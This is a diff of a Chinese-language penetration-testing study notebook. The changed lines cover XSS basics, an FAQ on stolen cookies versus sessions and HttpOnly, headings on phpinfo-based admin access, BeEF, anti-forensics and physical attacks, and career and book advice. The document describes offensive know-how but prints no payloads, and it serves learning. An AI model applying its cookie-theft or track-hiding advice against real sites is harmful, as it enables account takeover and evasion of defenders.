-xss攻击执行的是javascript脚本，所以xss的执行结果可以通过过滤拦截可以通过源码读取,javascript脚本能执行多强就意味着xss能达到什么样的攻击。只要有数据交互的，数据展示的地方就有可能存在xss攻击比如对你的用户名展示，对你输入的东西展示。比如留言，网站callback等
+xss攻击对提交表单或发出的链接请求中所有变量嵌入执行javascript脚本，所以xss的执行结果可以通过过滤拦截可以通过源码读取,javascript脚本能执行多强就意味着xss能达到什么样的攻击。只要有数据交互的，数据展示的地方就有可能存在xss攻击比如对你的用户名展示，对你输入的东西展示。比如留言，网站callback等
 
 
-**常见问题：cookie获取到了却登录不上？**
-区别两个术语
-cookie 储存本地 存活时间较长 小中型
-session 会话 存储服务器 存活时间较短  大型。session就像比如你登录了一次支付宝，过了几分钟不用就还需要你登录。一个session在服务器上会占用1kb，人多了还是挺耗内存的。
-对方网站如果只认cookie验证，那么你盗取session是没什么价值的。反过来只认session你盗取cookie做验证也是没有价值的
-
-**常见问题：cookie是空？**
-http-only打开了或没登录
 
 
 **技巧：从phpinfo返回信息获得管理权限**
@@ -3318,9 +3268,8 @@ beef还是很强大的，入侵成功后可以对对方页面进行跳转或者�
 
 #### httponly
 
-管理员只需要在配置文件中修改一句话就可以开启了。开启后无法通过js脚本读取cookie信息，这能一定程度增加了xss获取cookie的难度，换句话说开启了httponly你的xss后台获取的就是空。但这对其他xss没有过滤效果
-
-
+特殊字符过滤
+http-only（防御xss的cookie盗取）
 
 
 #### 绕过方案
@@ -5397,7 +5346,7 @@ ctrl+shift+F 全局搜索，通常搜索出关键词有可能匹配过多，可�
 
 # 待补充：物理攻击
 ## wifi
-## 
+## ID卡
 
 # 待补充：隐藏技术
 阻止防御者信息搜集，销毁行程记录，隐藏存留文件。
@@ -5445,6 +5394,8 @@ https://github.com/mitre/caldera
 精通xx,xx,xx语言，能独立开发poc和exp。
 获取xx张CNVD证书 和 xx CVE编号。
 在xx安全会议上进行过xx演讲。
+**找工作需了解**
+[安全从业者该去甲方还是乙方](https://www.freebuf.com/articles/es/228621.html)
 
 **写简历**
 免费简历模板，快速生成个人简历https://www.100chui.com/resume/
@@ -5834,8 +5785,6 @@ OWASP亚洲峰会
 
 ### 红蓝对抗
 国际叫法是蓝队是防守，红队是攻击
-```bash
-考
 
 ## 图书推荐
 **基础**
@@ -5926,11 +5875,6 @@ Hackear al Hacker. Aprende de los Expertos que Derrotan a los Hackers（难易�
 三星推荐
 级别：高级
 这书优点是相对市面上的书更专业和全面，即便冷门的知识也会在书中出现，不适合初学者，里面排版很乱，很多地方就是贴了一长串代码，并不做过多的解释，因为作者假设我们等级很高，眨眼。
-《The-Hacker-Playbook-3》
-五星推荐
-级别：中级
-2020 8月出版
-
 
 ## 博客
 
